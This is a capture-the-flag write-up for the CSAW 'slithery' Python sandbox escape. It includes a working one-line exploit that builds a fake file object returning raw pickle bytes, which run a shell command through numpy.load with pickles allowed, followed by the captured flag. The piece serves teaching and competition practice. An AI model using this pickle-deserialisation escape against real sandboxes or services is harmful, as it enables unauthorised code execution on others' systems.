# slithery

Author: [roerohan](https://github.com/roerohan) and [thebongy](https://github.com/thebongy)

# Requirements

- Python

# Source

- [sandbox.py](./sandbox.py)

```
Setting up a new coding environment for my data science students. Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you help test this before I use it for my class? Two sandboxes should be better than one...

nc pwn.chal.csaw.io 5011
```

# Exploitation

This is a python jail escape challenge. In the source file, you see the following lines:

```py
final_cmd = """
uOaoBPLLRN = open("sandbox.py", "r")
uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
uOaoBPLLRN.close()
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))\n""" + command
exec(final_cmd)
```

Once you decode these, they basically translate to:

```py
sandbox = open("sandbox.py", "r")
l = ['from', 'base64', 'import', 'b64decode']
base64 = l[1]
b64decode = l[-1]
sandbox.close()
base64_b64decode = getattr(__import__(base64), b64decode)
numpy = __builtins__.__dict__[base64_b64decode(b'X19pbXBvcnRfXw==').decode('utf-8')](base64_b64decode(b'bnVtcHk=').decode('utf-8'))
```

So you can see which variable stores what. Now, the script executes the command you entered along with the list of commands shown above, with obfuscated variable names. 
<br />

There is of course a blacklist, part of which have written in [blacklist.py](./blacklist.py). We notice `numpy` has been imported. `numpy` has a function `numpy.load()`, which can take load a pickle payload from a file, given the option `allow_pickle=True`. We know that we can execute RCE using pickle payloads, which is exactly what we have to do.
<br />

The challenge however is to create a `file like object` for `numpy.load()`, since you don't have access to write a file on the system. Reading the documentation for `numpy.load()` you find out that a `file like object` is any object which has the attributes `read`, `readline`, and `seek`. You don't need to implement these properly, but they must return the expected type of data. We pass the pickle payload as bytes in the `lambda x` function. Here's how you can do all of this in 1 line, keeping the blacklist in consideration.


```py
$ nc pwn.chal.csaw.io 5011
EduPy 3.8.2
>>> obj=lambda: None; setattr(obj, HrjYMvtxwA('cmVhZA==').decode(), lambda x: bytes([128, 3, 99, 112, 111, 115, 105, 120, 10, 115, 121, 115, 116, 101, 109, 10, 113, 0, 88, 12, 0, 0, 0, 99, 97, 116, 32, 102, 108, 97, 103, 46, 116, 120, 116, 113, 1, 133, 113, 2, 82, 113, 3, 46])); setattr(obj, HrjYMvtxwA('c2Vlaw==').decode(), lambda x,y:x); setattr(obj, HrjYMvtxwA('cmVhZGxpbmU=').decode(), lambda x: bytes([128, 3, 99, 112, 111, 115, 105, 120, 10, 115, 121, 115, 116, 101, 109, 10, 113, 0, 88, 12, 0, 0, 0, 99, 97, 116, 32, 102, 108, 97, 103, 46, 116, 120, 116, 113, 1, 133, 113, 2, 82, 113, 3, 46]));RMbPOQHCzt.load(obj, allow_pickle=True)
flag{y4_sl1th3r3d_0ut}
```

The flag is:

```
flag{y4_sl1th3r3d_0ut}
```
